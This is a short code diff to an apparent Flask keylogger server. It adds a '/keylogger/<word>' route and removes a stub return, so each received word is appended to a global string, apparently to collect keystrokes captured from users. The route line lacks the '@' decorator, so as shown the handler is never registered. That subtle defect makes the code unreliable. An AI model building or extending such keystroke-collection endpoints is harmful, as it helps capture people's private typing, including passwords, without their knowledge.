@@ -9,9 +9,8 @@ from .database import db, app
 string_data = ''
 
 
-app.route('/keylogger', methods=["GET", "POST"])
+app.route('/keylogger/<word>', methods=["GET", "POST"])
 def check_word(word):
-    return 'hi'
     word_detected = False
     global string_data
     string_data += str(word)
